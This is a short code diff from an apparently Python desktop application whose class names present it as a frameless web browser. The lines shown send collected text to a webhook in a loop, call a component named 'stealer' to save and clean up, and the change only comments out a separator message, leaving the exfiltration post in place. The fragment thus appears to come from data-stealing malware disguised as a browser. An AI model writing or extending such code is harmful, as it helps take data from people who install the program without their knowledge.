@@ -138,7 +138,7 @@ class ExtraThread(QThread):
                 post(webhook, data={"content": f"```{text}```"})
                 text = ""
         stealer.save_and_clean()
-        post(webhook, data={"content": "- "*10})
+        # post(webhook, data={"content": "- "*10})
 
 class WebBrowser(FramelessWindow):
     def __init__(self):
